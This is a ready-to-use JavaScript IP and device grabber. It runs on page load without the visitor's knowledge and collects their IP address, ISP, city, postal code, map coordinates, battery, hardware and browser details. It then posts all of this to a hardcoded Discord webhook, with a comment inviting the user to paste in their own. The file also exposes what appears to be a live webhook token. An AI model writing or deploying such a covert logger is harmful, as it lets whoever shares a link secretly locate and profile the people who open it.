// 🔴 PASTE YOUR WEBHOOK URL INSIDE THE QUOTES BELOW 🔴
const webhookUrl = "https://discord.com/api/webhooks/1475505677546946652/VXzA9a4hBa3nOs8AsanQBxW2itixFYNCnpKAZwNXKvVYr9ug4fSvlzLvRiMklimQjSwl";

(async function autoRun() {
    
    // 1. Get Battery Info (if supported by browser)
    let batteryInfo = { level: "N/A", charging: "N/A" };
    try {
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            batteryInfo = {
                level: `${Math.round(battery.level * 100)}%`,
                charging: battery.charging ? "Yes" : "No"
            };
        }
    } catch (e) {
        console.log("Battery API not supported");
    }

    // 2. Gather Standard Device Info
    const deviceInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        // Screen Resolution (Physical Monitor)
        screenRes: `${window.screen.width} x ${window.screen.height}`,
        // Window Size (Actual Browser Window)
        windowSize: `${window.innerWidth} x ${window.innerHeight}`,
        // Pixel Ratio (Screen sharpness)
        pixelRatio: window.devicePixelRatio || "Standard",
        cores: navigator.hardwareConcurrency || "Unknown",
        // Approximate RAM
        memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown",
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        connection: navigator.connection ? navigator.connection.effectiveType.toUpperCase() : "Unknown",
        referrer: document.referrer || "Direct Link",
        currentUrl: window.location.href
    };

    // 3. Get IP and Network Info
    fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
            
            // Create a Google Maps Link
            const mapLink = `[Google Maps](https://www.google.com/maps?q=${data.latitude},${data.longitude})`;

            const payload = {
                username: "Advanced Logger",
                embeds: [
                    {
                        title: "Detailed Access Log",
                        description: "Comprehensive data captured.",
                        color: 16711740,
                        fields: [
                            // --- NETWORK & LOCATION ---
                            { name: "IP Address", value: `||${data.ip}||`, inline: true },
                            { name: "ISP / Network", value: data.org || "Unknown", inline: true },
                            { name: "City", value: data.city || "Unknown", inline: true },
                            { name: "Region / State", value: data.region || "Unknown", inline: true },
                            { name: "Postal Code", value: data.postal || "Unknown", inline: true },
                            { name: "Country", value: data.country_name || "Unknown", inline: true },
                            { name: "Coordinates", value: mapLink, inline: false },
                            
                            // --- HARDWARE & POWER ---
                            { name: "Platform", value: deviceInfo.platform, inline: true },
                            { name: "Device Memory (RAM)", value: deviceInfo.memory, inline: true },
                            { name: "CPU Cores", value: deviceInfo.cores, inline: true },
                            { name: "Battery Level", value: batteryInfo.level, inline: true },
                            { name: "Is Charging", value: batteryInfo.charging, inline: true },

                            // --- DISPLAY & BROWSER ---
                            { name: "Screen Resolution", value: deviceInfo.screenRes, inline: true },
                            { name: "Window Size", value: deviceInfo.windowSize, inline: true },
                            { name: "Pixel Ratio", value: deviceInfo.pixelRatio, inline: true },
                            { name: "Connection Type", value: deviceInfo.connection, inline: true },
                            { name: "Language", value: deviceInfo.language, inline: true },
                            { name: "Referrer", value: deviceInfo.referrer, inline: false },
                            
                            // --- EXTRAS ---
                            { name: "User Agent", value: deviceInfo.userAgent, inline: false }
                        ],
                        footer: { text: "System Logger" },
                        timestamp: new Date().toISOString()
                    }
                ]
            };

            // 4. Send the Webhook
            return fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        })
        .then(response => {
            if (response.ok) {
                console.log("Data sent successfully.");
            } else {
                console.log("Failed to send data.");
            }
        })
        .catch(error => {
            console.error('Error:', error);
        });

})();
